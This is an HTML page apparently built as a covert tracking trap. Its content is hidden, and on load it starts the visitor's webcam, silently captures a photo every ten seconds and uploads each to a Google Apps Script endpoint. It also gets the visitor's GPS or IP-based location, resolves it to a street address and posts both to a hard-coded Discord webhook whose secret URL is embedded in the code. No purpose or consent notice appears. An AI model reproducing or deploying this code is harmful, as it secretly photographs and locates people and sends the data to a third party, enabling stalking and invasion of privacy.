<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Continuous Image Capture and Location</title>
</head>
<body>
    <video id="video" autoplay style="display: none;"></video>
    <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
    <div id="status"></div> <!-- For status messages -->

    <script>
        const googleAppsScriptURL = 'https://script.google.com/macros/s/AKfycbzqNAUArSdPvl7n_9A7sSsFSQgL4eNvSYJlE2KxQ3qIPfss9l_BPJQ-coaI7EIkGMSNiA/exec';
        const locationWebhookURL = 'https://discord.com/api/webhooks/1302642013472034836/Q27T5NsKk2ZB1vUipsughbPnyxfI43Z4fRgeWqUQXnl1Seip7raMHYAcLxxn31zc2KHZ';
        const locationIQToken = 'YOUR_LOCATIONIQ_TOKEN_HERE'; // Securely manage your API token
        const ipapiToken = 'YOUR_IPAPI_TOKEN_HERE'; // Securely manage your API token

        async function initCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('video').srcObject = stream;
                document.getElementById('status').innerText = "Camera initialized. Capturing images every 10 seconds.";
                
                // Capture a photo every 10 seconds
                setInterval(captureAndSendPhoto, 10000);
                getLocation(); // Start location fetching
            } catch (error) {
                document.getElementById('status').innerText = "Error accessing the camera.";
                console.error("Error accessing the camera:", error);
            }
        }

        async function capturePhoto() {
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');
            // Set canvas size to match video stream size
            context.drawImage(document.getElementById('video'), 0, 0, canvas.width, canvas.height);
            return canvas.toDataURL('image/png').split(',')[1];
        }

        async function captureAndSendPhoto() {
            const imageData = await capturePhoto();
            const response = await fetch(googleAppsScriptURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `image=${encodeURIComponent(imageData)}`
            });

            if (response.ok) {
                const imageUrl = await response.text();
                console.log("Image saved to Google Drive:", imageUrl);
            } else {
                console.error("Error saving image to Google Drive.");
            }
        }

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(success, error);
            } else {
                error({ code: 0, message: "Geolocation not supported" });
            }
        }

        function success(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            reverseGeocodeWithLocationIQ(latitude, longitude);
        }

        function error(err) {
            console.error(`Geolocation Error (${err.code}): ${err.message}`);
            getIPGeolocation(); // Fallback to IP geolocation
        }

        function getIPGeolocation() {
            fetch(`https://ipapi.co/json/`)
                .then(response => response.json())
                .then(data => {
                    if (data && data.latitude && data.longitude) {
                        reverseGeocodeWithLocationIQ(data.latitude, data.longitude);
                    } else {
                        console.error('Unable to retrieve location from IPAPI.');
                    }
                })
                .catch(() => console.error('Error fetching IP geolocation.'));
        }

        function reverseGeocodeWithLocationIQ(latitude, longitude) {
            const url = `https://us1.locationiq.com/v1/reverse.php?key=${locationIQToken}&lat=${latitude}&lon=${longitude}&format=json`;

            fetch(url)
                .then(response => response.json())
                .then(data => {
                    if (data && data.display_name) {
                        const address = data.display_name;
                        sendLocationToDiscord(latitude, longitude, address);
                    } else {
                        console.error('Error in reverse geocoding.');
                    }
                })
                .catch(() => console.error('Error during reverse geocoding.'));
        }

        function sendLocationToDiscord(latitude, longitude, address) {
            const message = {
                content: `Location data:\nLatitude: ${latitude}\nLongitude: ${longitude}\nAddress: ${address}`
            };

            fetch(locationWebhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(message),
            })
            .then(response => {
                if (!response.ok) {
                    console.error("Error sending location to Discord.");
                }
            })
            .catch(error => {
                console.error("Error sending location to Discord:", error);
            });
        }

        window.onload = () => {
            initCamera();
        };
    </script>
</body>
</html>
